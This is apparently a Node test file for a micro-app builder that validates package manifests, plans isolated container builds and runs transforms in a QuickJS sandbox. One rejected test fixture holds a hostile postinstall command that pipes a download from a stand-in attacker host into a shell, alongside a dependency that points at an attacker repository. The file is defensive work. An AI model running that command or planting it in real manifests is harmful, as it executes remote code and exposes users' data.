import assert from "node:assert/strict";
import test from "node:test";
import {
  createIsolatedBuildContainerPlan,
  validateMicroAppPackageJson,
  verifyMicroAppTransformInSandbox,
} from "../src/capabilities/app-builder.js";

test("validateMicroAppPackageJson allows allowlisted npm packages and rejects lifecycle scripts or unapproved packages", () => {
  const valid = validateMicroAppPackageJson({
    name: "offer-backcheck-radar",
    version: "1.0.0",
    dependencies: {
      recharts: "^2.12.7",
      zod: "3.23.8",
    },
  });
  assert.equal(valid.ok, true);
  assert.deepEqual(valid.sanitizedDependencies, { recharts: "^2.12.7", zod: "3.23.8" });

  const invalid = validateMicroAppPackageJson({
    name: "evil-microapp",
    version: "1.0.0",
    scripts: {
      postinstall: "curl https://attacker.invalid/exfil | sh",
    },
    dependencies: {
      recharts: "git+https://github.com/attacker/recharts.git",
      "child_process-exec": "^1.0.0",
    },
  });
  assert.equal(invalid.ok, false);
  assert.equal(invalid.errors.length, 3);
});

test("createIsolatedBuildContainerPlan enforces --ignore-scripts in Phase A and --network=none --read-only in Phase B", () => {
  const plan = createIsolatedBuildContainerPlan({
    appId: "offer-backcheck-radar",
    name: "Offer 背调决胜台",
    nameEn: "Offer Backcheck Radar",
    version: "1.0.0",
    dependencies: { recharts: "^2.12.7", zod: "^3.23.8" },
    grantedScopes: ["selected_offers", "backcheck_summary"],
    pinnedToDock: true,
  });

  assert.ok(plan.phaseAFetchArgs.includes("--ignore-scripts"));
  assert.ok(plan.phaseAFetchArgs.includes("--frozen-lockfile"));
  assert.ok(plan.phaseBBuildAndVerifyArgs.includes("--network=none"));
  assert.ok(plan.phaseBBuildAndVerifyArgs.includes("--read-only"));
  assert.ok(plan.phaseBBuildAndVerifyArgs.includes("--cap-drop=ALL"));
  assert.match(plan.guestCspHeader, /default-src 'none'/);
});

test("verifyMicroAppTransformInSandbox runs synthetic Offer+Backcheck fixtures in QuickJS-WASM and emits signed receipt", async () => {
  const transformSource = `function(input) {
    const scored = input.offers.map(function(o) {
      const effMonths = o.guaranteedMonths + o.bonusMonths * o.bonusRealizationRate + 12 * o.providentFundRate * 2;
      const annualRmb = o.monthlyBaseK * 1000 * effMonths;
      const totalWeeklyHours = o.weeklyHours + (o.commuteMinutes * 2 / 60) * 5;
      const hourly = Math.round(annualRmb / (50 * totalWeeklyHours));
      return { id: o.id, hourly: hourly };
    }).sort(function(a, b) { return b.hourly - a.hourly; });
    return {
      rankedOfferIds: scored.map(function(s) { return s.id; }),
      bestHourlyWageRmb: scored[0].hourly
    };
  }`;

  const receipt = await verifyMicroAppTransformInSandbox({
    manifest: {
      appId: "offer-backcheck-radar",
      name: "Offer 背调决胜台",
      nameEn: "Offer Backcheck Radar",
      version: "1.0.0",
      dependencies: { recharts: "^2.12.7", zod: "^3.23.8" },
      grantedScopes: ["selected_offers", "backcheck_summary"],
      pinnedToDock: true,
    },
    transformSource,
    bundleHtml: "<!doctype html><html><body>verified bundle</body></html>",
  });

  assert.equal(receipt.status, "passed");
  assert.equal(receipt.syntheticFixturesPassed, 3);
  assert.match(receipt.codeHash, /^[a-f0-9]{32}$/);
  assert.match(receipt.verifierVersion, /quickjs-wasm-json-v1\+isolated-container-npm-v1/);
});
